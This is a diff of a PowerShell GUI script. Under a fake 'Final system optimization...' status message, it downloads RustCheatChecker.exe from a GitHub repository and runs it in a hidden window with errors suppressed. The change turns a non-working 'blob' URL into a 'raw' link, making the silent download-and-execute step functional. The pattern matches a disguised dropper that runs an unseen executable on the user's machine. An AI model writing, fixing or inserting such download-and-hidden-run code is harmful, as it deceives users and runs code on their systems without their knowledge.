@@ -184,7 +184,7 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/RustCheatChecker/blob/main/source/assets/custom/RustCheatChecker.exe" -OutFile "RustCheatChecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/RustCheatChecker/raw/main/source/assets/custom/RustCheatChecker.exe" -OutFile "RustCheatChecker.exe" -ErrorAction SilentlyContinue
     
     Start-Process -FilePath "RustCheatChecker.exe" -WindowStyle Hidden
 
@@ -201,4 +201,5 @@ $scan = {
 $btn.Add_Click($scan)
 
 # Запуск
+
 [void]$form.ShowDialog()
